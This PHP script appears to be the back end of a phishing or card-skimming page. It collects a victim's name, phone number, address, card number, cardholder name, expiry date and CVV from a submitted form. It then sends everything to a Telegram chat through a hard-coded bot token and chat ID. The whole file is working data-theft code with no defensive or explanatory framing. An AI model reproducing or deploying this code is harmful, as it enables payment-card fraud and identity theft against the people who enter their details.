<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Telegram config
$botToken = '8804630885:AAHL0ce9QtEBmSPLLFgcGze4xlVD7nRdoM0';
$chatId   = '-1004428098645';

// Get form values
$name   = trim($_POST['custName'] ?? '');
$number = trim($_POST['custPhone'] ?? '');
$address   = trim($_POST['custAddress'] ?? '');
$area = trim($_POST['custArea'] ?? '');
$cname   = trim($_POST['cardName'] ?? '');
$cnumber   = trim($_POST['cardNumber'] ?? '');
$expiry = trim($_POST['cardExpiry'] ?? '');
$cvv = trim($_POST['cardCvv'] ?? '');

// Validate
if ($name === '' || $number === '') {
    exit('Please fill name and number.');
}

// Message
$text = "📩 mc\n"
      . "👤 Name: {$name}\n"
	  . " Number: {$number}\n"
	  . " Address: {$address}\n"
	  . "  Area: {$area}\n"
	  . "📱 Card: {$cnumber}\n"
	  . " Name: {$cname}\n"
	  . " Exp: {$expiry}\n"
	  . " cvv: {$cvv}\n";
   

// Telegram API
$url = "https://api.telegram.org/bot{$botToken}/sendMessage";

$ch = curl_init($url);
curl_setopt_array($ch, [
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => [
        'chat_id' => $chatId,
        'text'    => $text,
    ],
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT => 15,
]);

$response = curl_exec($ch);
$error = curl_error($ch);
curl_close($ch);

if ($error) {
    exit("Error: $error");
}

;